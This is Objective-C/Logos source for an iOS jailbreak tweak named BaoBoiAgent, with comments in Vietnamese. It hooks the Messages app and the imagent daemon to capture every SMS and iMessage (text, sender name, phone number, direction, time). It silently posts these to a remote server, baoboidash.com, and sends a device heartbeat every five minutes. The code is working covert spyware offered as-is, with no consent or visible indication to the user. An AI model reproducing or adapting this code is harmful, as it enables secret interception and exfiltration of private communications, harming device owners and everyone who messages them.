// BaoBoiAgent Tweak - v1.4.3
// KHÔNG inject vào SpringBoard
// MobileSMS: hook SMS
// imagent: hook iMessage
// Heartbeat: chạy từ imagent (daemon luôn chạy nền)

#import <Foundation/Foundation.h>

// ─── Cấu hình ────────────────────────────────────────────────────────────────
static NSString *const kServerURL = @"https://baoboidash.com/api/trpc/device.log";
static NSString *const kDeviceTokenKey = @"BaoBoiDeviceToken";
static NSString *const kSuiteName = @"com.baoboi.agent";

static NSString *getDeviceToken() {
    NSUserDefaults *suite = [[NSUserDefaults alloc] initWithSuiteName:kSuiteName];
    NSString *token = [suite stringForKey:kDeviceTokenKey];
    if (!token || token.length == 0) {
        token = [[NSUserDefaults standardUserDefaults] stringForKey:kDeviceTokenKey];
    }
    return token ?: @"";
}

static void sendToServer(NSDictionary *payload) {
    NSString *token = getDeviceToken();
    if (token.length == 0) return;

    NSMutableDictionary *body = [payload mutableCopy];
    body[@"deviceToken"] = token;

    NSError *err = nil;
    NSData *data = [NSJSONSerialization dataWithJSONObject:@{@"json": body} options:0 error:&err];
    if (!data || err) return;

    NSURL *url = [NSURL URLWithString:kServerURL];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    req.HTTPBody = data;
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    req.timeoutInterval = 15;

    [[[NSURLSession sharedSession] dataTaskWithRequest:req
        completionHandler:^(NSData *d, NSURLResponse *r, NSError *e){}] resume];
}

static void sendHeartbeat() {
    @try {
        // Lấy thông tin thiết bị không dùng UIKit (tránh crash trong non-UI process)
        NSDictionary *payload = @{
            @"event": @"device_online",
            @"deviceName": [[NSProcessInfo processInfo] hostName] ?: @"iPhone",
            @"systemVersion": [[NSProcessInfo processInfo] operatingSystemVersionString] ?: @"",
            @"model": @"iPhone",
        };
        sendToServer(payload);
    } @catch (...) {}
}

static void sendMessageEvent(NSString *text, NSString *senderName, NSString *senderPhone,
                              NSString *platform, BOOL isIncoming, long long sentAtMs) {
    if (text.length == 0) return;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        sendToServer(@{
            @"event": @"new_message",
            @"msgContent": text,
            @"msgSenderName": senderName ?: @"",
            @"msgSenderPhone": senderPhone ?: @"",
            @"msgPlatform": platform ?: @"sms",
            @"msgIsIncoming": @(isIncoming),
            @"msgSentAt": @(sentAtMs),
        });
    });
}

// ─── MobileSMS: hook tin nhắn SMS ────────────────────────────────────────────
%group MobileSMSHooks

%hook CKMessagesController

- (void)conversationList:(id)list didReceiveMessages:(NSArray *)messages {
    %orig;
    @try {
        for (id message in messages) {
            NSString *text = @"", *senderHandle = @"", *senderName = @"";
            BOOL isIncoming = YES;
            long long sentTime = (long long)([[NSDate date] timeIntervalSince1970] * 1000);

            if ([message respondsToSelector:@selector(text)])
                text = [message performSelector:@selector(text)] ?: @"";
            if ([message respondsToSelector:@selector(sender)]) {
                id s = [message performSelector:@selector(sender)];
                if ([s respondsToSelector:@selector(ID)])
                    senderHandle = [s performSelector:@selector(ID)] ?: @"";
                if ([s respondsToSelector:@selector(name)])
                    senderName = [s performSelector:@selector(name)] ?: @"";
            }
            if ([message respondsToSelector:@selector(isFromMe)])
                isIncoming = ![[message performSelector:@selector(isFromMe)] boolValue];
            if ([message respondsToSelector:@selector(time)]) {
                id t = [message performSelector:@selector(time)];
                if ([t isKindOfClass:[NSDate class]])
                    sentTime = (long long)([(NSDate *)t timeIntervalSince1970] * 1000);
            }
            sendMessageEvent(text, senderName.length > 0 ? senderName : senderHandle,
                             senderHandle, @"sms", isIncoming, sentTime);
        }
    } @catch (...) {}
}

%end

%end // MobileSMSHooks

// ─── imagent: hook iMessage + heartbeat ──────────────────────────────────────
%group ImagentHooks

%hook CKConversation

- (void)_handleIncomingMessage:(id)message {
    %orig;
    @try {
        NSString *text = @"", *senderHandle = @"", *senderName = @"";
        BOOL isIncoming = YES;
        long long sentTime = (long long)([[NSDate date] timeIntervalSince1970] * 1000);
        NSString *platform = @"imessage";

        if ([message respondsToSelector:@selector(text)])
            text = [message performSelector:@selector(text)] ?: @"";
        if ([message respondsToSelector:@selector(sender)]) {
            id s = [message performSelector:@selector(sender)];
            if ([s respondsToSelector:@selector(ID)])
                senderHandle = [s performSelector:@selector(ID)] ?: @"";
            if ([s respondsToSelector:@selector(name)])
                senderName = [s performSelector:@selector(name)] ?: @"";
        }
        if ([message respondsToSelector:@selector(isFromMe)])
            isIncoming = ![[message performSelector:@selector(isFromMe)] boolValue];
        if ([message respondsToSelector:@selector(time)]) {
            id t = [message performSelector:@selector(time)];
            if ([t isKindOfClass:[NSDate class]])
                sentTime = (long long)([(NSDate *)t timeIntervalSince1970] * 1000);
        }
        if ([message respondsToSelector:@selector(service)]) {
            id svc = [message performSelector:@selector(service)];
            if ([svc respondsToSelector:@selector(name)]) {
                NSString *n = [svc performSelector:@selector(name)] ?: @"";
                if ([n containsString:@"SMS"] || [n containsString:@"MMS"])
                    platform = @"sms";
            }
        }
        sendMessageEvent(text, senderName.length > 0 ? senderName : senderHandle,
                         senderHandle, platform, isIncoming, sentTime);
    } @catch (...) {}
}

%end

%end // ImagentHooks

// ─── Constructor ─────────────────────────────────────────────────────────────
%ctor {
    NSString *proc = [[NSProcessInfo processInfo] processName];

    if ([proc isEqualToString:@"MobileSMS"]) {
        %init(MobileSMSHooks);

    } else if ([proc isEqualToString:@"imagent"]) {
        %init(ImagentHooks);

        // Heartbeat từ imagent (luôn chạy nền)
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC),
                       dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
            sendHeartbeat();
        });

        dispatch_source_t timer = dispatch_source_create(
            DISPATCH_SOURCE_TYPE_TIMER, 0, 0,
            dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0));
        dispatch_source_set_timer(timer,
            dispatch_time(DISPATCH_TIME_NOW, 5 * 60 * NSEC_PER_SEC),
            5 * 60 * NSEC_PER_SEC, 30 * NSEC_PER_SEC);
        dispatch_source_set_event_handler(timer, ^{ sendHeartbeat(); });
        dispatch_resume(timer);
    }
    // SpringBoard: KHÔNG làm gì cả
}
